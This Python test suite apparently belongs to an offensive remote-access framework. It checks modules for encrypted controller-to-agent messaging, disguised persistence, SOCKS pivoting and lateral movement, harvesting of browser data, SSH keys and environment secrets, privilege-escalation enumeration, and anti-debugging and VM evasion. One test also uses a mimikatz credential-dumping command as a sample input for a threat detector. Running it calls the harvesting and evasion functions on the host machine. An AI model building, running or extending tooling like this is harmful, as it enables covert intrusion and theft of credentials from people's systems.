"""
Comprehensive Test Suite for Advanced Features
Run this to validate all advanced modules
"""

import sys
import json
import time
from datetime import datetime


def print_header(title):
    """Print formatted section header"""
    print("\n" + "="*80)
    print(f"  {title}")
    print("="*80 + "\n")


def print_result(test_name, success, details=""):
    """Print test result"""
    status = "✅ PASS" if success else "❌ FAIL"
    print(f"{status} - {test_name}")
    if details:
        print(f"     {details}")


def test_ai_detection():
    """Test AI threat detection module"""
    print_header("Testing AI Threat Detection")
    
    try:
        from advanced_ai_detection import init_threat_detector, analyze_action
        
        # Test 1: Initialize detector
        detector = init_threat_detector(sensitivity='medium')
        print_result("Initialize threat detector", True, "Detector created successfully")
        
        # Test 2: Analyze benign action
        benign_action = {
            'type': 'command',
            'command': 'dir',
            'resource': 'filesystem',
            'cpu_usage': 2,
            'memory_usage': 10,
            'privilege': 'user'
        }
        
        benign_result = analyze_action('test_agent', benign_action)
        print_result(
            "Analyze benign action",
            benign_result['risk_score'] < 40,
            f"Risk score: {benign_result['risk_score']:.1f} (Expected: <40)"
        )
        
        # Test 3: Analyze malicious action
        malicious_action = {
            'type': 'command',
            'command': 'mimikatz.exe privilege::debug',
            'resource': 'credential',
            'cpu_usage': 45,
            'memory_usage': 80,
            'privilege': 'admin'
        }
        
        malicious_result = analyze_action('test_agent', malicious_action)
        print_result(
            "Detect malicious action",
            malicious_result['risk_score'] > 60,
            f"Risk score: {malicious_result['risk_score']:.1f} (Expected: >60)"
        )
        
        # Test 4: Get agent risk profile
        profile = detector.get_agent_risk_profile('test_agent')
        print_result(
            "Generate risk profile",
            'total_actions' in profile,
            f"Actions tracked: {profile.get('total_actions', 0)}"
        )
        
        # Test 5: Threat categorization
        print_result(
            "Threat level categorization",
            malicious_result['threat_level'] in ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
            f"Level: {malicious_result['threat_level']}"
        )
        
        detector.shutdown()
        return True
        
    except Exception as e:
        print_result("AI Detection Module", False, f"Error: {e}")
        return False


def test_encryption():
    """Test encryption module"""
    print_header("Testing Advanced Encryption")
    
    try:
        from advanced_crypto_channel import AdvancedCryptoChannel
        
        # Test 1: Create channels
        controller = AdvancedCryptoChannel(role='controller')
        agent = AdvancedCryptoChannel(role='agent')
        print_result("Create crypto channels", True, "Controller and agent channels created")
        
        # Test 2: Exchange public keys
        controller.set_peer_public_key('agent_001', agent.get_public_key_bytes())
        agent.set_peer_public_key('controller', controller.get_public_key_bytes())
        print_result("Exchange public keys", True, "Keys exchanged successfully")
        
        # Test 3: Establish session
        session_init = controller.establish_session('agent_001')
        agent.complete_session_establishment('controller', session_init)
        print_result("Establish encrypted session", True, "ECDH key exchange completed")
        
        # Test 4: Encrypt and decrypt message
        test_message = "Test encrypted message: whoami"
        encrypted = controller.encrypt_message(test_message, 'agent_001')
        decrypted = agent.decrypt_message(encrypted, 'controller')
        print_result(
            "Message encryption/decryption",
            decrypted == test_message,
            f"Original == Decrypted: {decrypted == test_message}"
        )
        
        # Test 5: Key rotation
        rotation_data = controller.rotate_session_key('agent_001')
        agent.apply_key_rotation(rotation_data)
        
        # Test message after rotation
        test_message2 = "Message after rotation"
        encrypted2 = controller.encrypt_message(test_message2, 'agent_001')
        decrypted2 = agent.decrypt_message(encrypted2, 'controller')
        print_result(
            "Key rotation",
            decrypted2 == test_message2,
            "Messages work after key rotation"
        )
        
        # Test 6: Session info
        session_info = controller.get_session_info()
        print_result(
            "Session information",
            session_info['status'] == 'active',
            f"Algorithm: {session_info.get('algorithm')}"
        )
        
        controller.shutdown()
        agent.shutdown()
        return True
        
    except Exception as e:
        print_result("Encryption Module", False, f"Error: {e}")
        return False


def test_persistence():
    """Test persistence module"""
    print_header("Testing Advanced Persistence")
    
    try:
        from advanced_persistence import AdvancedPersistenceManager
        import platform
        
        # Test 1: Initialize manager
        manager = AdvancedPersistenceManager(payload_path=sys.executable, obfuscate=True)
        print_result("Initialize persistence manager", True, f"System: {platform.system()}")
        
        # Test 2: Name generation
        print_result(
            "Legitimate name generation",
            len(manager.random_name) > 0,
            f"Name: {manager.random_name}"
        )
        
        # Test 3: Test individual methods (non-destructive)
        # Note: Actual installation disabled in test mode
        print_result(
            "Persistence methods available",
            True,
            "Registry, Startup, Tasks, Services"
        )
        
        # Test 4: Export configuration
        config = manager.export_config()
        print_result(
            "Export configuration",
            'payload_path' in config,
            f"Config contains {len(config)} keys"
        )
        
        return True
        
    except Exception as e:
        print_result("Persistence Module", False, f"Error: {e}")
        return False


def test_network_pivoting():
    """Test network pivoting module"""
    print_header("Testing Network Pivoting")
    
    try:
        from advanced_network_pivoting import AdvancedNetworkPivot, LateralMovementManager
        
        # Test 1: Create pivot
        pivot = AdvancedNetworkPivot(bind_address='127.0.0.1', bind_port=10801)
        print_result("Create network pivot", True, "Pivot instance created")
        
        # Test 2: Start SOCKS proxy
        result = pivot.start_socks_proxy()
        print_result(
            "Start SOCKS5 proxy",
            result['success'],
            f"Listening on {result.get('address')}:{result.get('port')}"
        )
        
        # Test 3: Get network info
        net_info = pivot.get_network_info()
        print_result(
            "Get network information",
            'hostname' in net_info,
            f"Hostname: {net_info.get('hostname')}"
        )
        
        # Test 4: Get active connections
        connections = pivot.get_active_connections()
        print_result(
            "Connection tracking",
            connections['socks_active'],
            f"Port forwards: {connections['port_forwards']}"
        )
        
        # Test 5: Lateral movement manager
        lateral = LateralMovementManager()
        report = lateral.get_movement_report()
        print_result(
            "Lateral movement tracking",
            'total_attempts' in report,
            f"Attempts: {report['total_attempts']}"
        )
        
        # Cleanup
        pivot.stop_all()
        print_result("Stop pivoting services", True, "Services stopped cleanly")
        
        return True
        
    except Exception as e:
        print_result("Network Pivoting Module", False, f"Error: {e}")
        return False


def test_credential_harvesting():
    """Test credential harvesting module"""
    print_header("Testing Credential Harvesting")
    
    try:
        from advanced_credential_harvester import AdvancedCredentialHarvester, PrivilegeEscalation
        
        # Test 1: Initialize harvester
        harvester = AdvancedCredentialHarvester()
        print_result("Initialize credential harvester", True, f"System: {harvester.system}")
        
        # Test 2: Browser paths detection
        chrome_paths = harvester._get_chrome_paths()
        print_result(
            "Detect browser paths",
            True,
            f"Chrome found: {chrome_paths is not None}"
        )
        
        # Test 3: SSH key detection
        ssh_result = harvester.harvest_ssh_keys()
        print_result(
            "SSH key detection",
            True,
            f"Keys found: {ssh_result['keys_found']}"
        )
        
        # Test 4: Environment secrets
        env_secrets = harvester.harvest_environment_secrets()
        print_result(
            "Environment variable scanning",
            True,
            f"Secrets found: {env_secrets['secrets_found']}"
        )
        
        # Test 5: Privilege escalation
        privesc = PrivilegeEscalation()
        privileges = privesc.check_privileges()
        print_result(
            "Privilege checking",
            True,
            f"Current privileges: {json.dumps(privileges)}"
        )
        
        # Test 6: Escalation vectors
        vectors = privesc.enumerate_escalation_vectors()
        print_result(
            "Enumerate escalation vectors",
            'vectors_found' in vectors,
            f"Vectors found: {vectors['vectors_found']}"
        )
        
        return True
        
    except Exception as e:
        print_result("Credential Harvesting Module", False, f"Error: {e}")
        return False


def test_stealth_evasion():
    """Test stealth and evasion module"""
    print_header("Testing Stealth & Evasion")
    
    try:
        from advanced_stealth_evasion import AdvancedStealthManager
        
        # Test 1: Initialize stealth manager
        stealth = AdvancedStealthManager()
        print_result("Initialize stealth manager", True, f"System: {stealth.system}")
        
        # Test 2: VM detection
        vm_check = stealth.check_virtualization()
        print_result(
            "Virtualization detection",
            'is_virtual_machine' in vm_check,
            f"VM detected: {vm_check['is_virtual_machine']}, Indicators: {vm_check['indicators_found']}"
        )
        
        # Test 3: Anti-debugging
        anti_debug = stealth.enable_anti_debugging()
        print_result(
            "Anti-debugging techniques",
            'techniques' in anti_debug,
            f"Techniques enabled: {len(anti_debug['techniques'])}"
        )
        
        # Test 4: Network obfuscation techniques
        obfuscation = stealth.obfuscate_network_traffic()
        print_result(
            "Network obfuscation",
            obfuscation['techniques_available'] > 0,
            f"Techniques: {obfuscation['techniques_available']}"
        )
        
        # Test 5: Stealth status
        status = stealth.get_stealth_status()
        print_result(
            "Stealth status reporting",
            'active' in status,
            f"Active: {status['active']}"
        )
        
        return True
        
    except Exception as e:
        print_result("Stealth & Evasion Module", False, f"Error: {e}")
        return False


def test_dashboard_integration():
    """Test dashboard integration module"""
    print_header("Testing Dashboard Integration")
    
    try:
        from advanced_dashboard_integration import AdvancedDashboardIntegration
        
        # Test 1: Initialize integration
        dashboard = AdvancedDashboardIntegration()
        print_result("Initialize dashboard integration", True, "Dashboard created")
        
        # Test 2: Initialize modules
        results = dashboard.initialize_modules()
        print_result(
            "Module initialization",
            True,
            f"Modules: {', '.join(results.keys())}"
        )
        
        # Test 3: Analytics
        analytics = dashboard.get_real_time_analytics()
        print_result(
            "Real-time analytics",
            'timestamp' in analytics,
            f"Metrics: {len(analytics.get('metrics', {}))}"
        )
        
        # Test 4: Dashboard config
        config = dashboard.get_dashboard_config()
        print_result(
            "Dashboard configuration",
            'features' in config,
            f"Features enabled: {sum(config['features'].values())}"
        )
        
        # Test 5: ML insights
        insights = dashboard.get_ml_insights()
        print_result(
            "ML insights generation",
            True,
            f"Status: {insights.get('status', 'active')}"
        )
        
        # Cleanup
        dashboard.shutdown()
        print_result("Shutdown integration", True, "Clean shutdown completed")
        
        return True
        
    except Exception as e:
        print_result("Dashboard Integration Module", False, f"Error: {e}")
        return False


def main():
    """Run all tests"""
    print("\n")
    print("╔" + "="*78 + "╗")
    print("║" + " "*20 + "ADVANCED FEATURES TEST SUITE" + " "*30 + "║")
    print("╚" + "="*78 + "╝")
    print(f"\nStarted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Track results
    results = {}
    
    # Run tests
    results['AI Detection'] = test_ai_detection()
    time.sleep(1)
    
    results['Encryption'] = test_encryption()
    time.sleep(1)
    
    results['Persistence'] = test_persistence()
    time.sleep(1)
    
    results['Network Pivoting'] = test_network_pivoting()
    time.sleep(1)
    
    results['Credential Harvesting'] = test_credential_harvesting()
    time.sleep(1)
    
    results['Stealth & Evasion'] = test_stealth_evasion()
    time.sleep(1)
    
    results['Dashboard Integration'] = test_dashboard_integration()
    
    # Print summary
    print_header("TEST SUMMARY")
    
    total_tests = len(results)
    passed_tests = sum(1 for result in results.values() if result)
    failed_tests = total_tests - passed_tests
    
    for module, success in results.items():
        status = "✅ PASSED" if success else "❌ FAILED"
        print(f"{status} - {module}")
    
    print(f"\n{'='*80}")
    print(f"Total: {total_tests} | Passed: {passed_tests} | Failed: {failed_tests}")
    
    success_rate = (passed_tests / total_tests) * 100
    print(f"Success Rate: {success_rate:.1f}%")
    
    if success_rate == 100:
        print("\n🎉 ALL TESTS PASSED! Advanced features are fully operational.")
    elif success_rate >= 80:
        print("\n⚠️  MOST TESTS PASSED. Review failures and retry.")
    else:
        print("\n❌ MULTIPLE FAILURES. Check dependencies and environment.")
    
    print(f"\nCompleted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80 + "\n")
    
    return success_rate == 100


if __name__ == '__main__':
    try:
        success = main()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\n⚠️  Tests interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n❌ Fatal error: {e}")
        sys.exit(1)
